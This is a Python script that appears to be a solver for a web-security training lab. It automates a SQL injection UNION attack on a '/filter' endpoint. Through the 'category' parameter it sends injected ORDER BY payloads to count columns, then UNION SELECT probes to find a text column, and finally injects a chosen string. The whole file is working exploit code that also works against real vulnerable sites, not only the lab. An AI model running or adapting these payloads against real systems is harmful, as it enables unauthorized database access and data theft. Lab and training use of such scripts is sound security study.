from ...utils import *
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    print_info("Extracting string value provided by lab...")
    resp = session.get_path("/")
    soup = BeautifulSoup(resp.text, "html.parser")
    hint = soup.select_one("#hint").text

    value = re.match(r"Make the database retrieve the string: '([^']+)'", hint).group(1)
    print_success(f"Provided string value: {value}\n")

    path = "/filter"
    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} --"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    print_success(f"There are {num_columns} columns.\n")
    print_info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        print_fail("Unable to find a column with the string data type")
    else:
        print_success(f"Column {i} has the string data type.\n")

    # Construct columns string
    columns = ["null"] * num_columns
    columns[i] = f"'{value}'"
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} --"}

    print_info(
        f'Performing SQL injection UNION attack by visiting "{path}" with the following parameters:'
    )
    print(params)

    session.get_path(path, params=params)
    print_success("SQL injection UNION attack performed.\n")
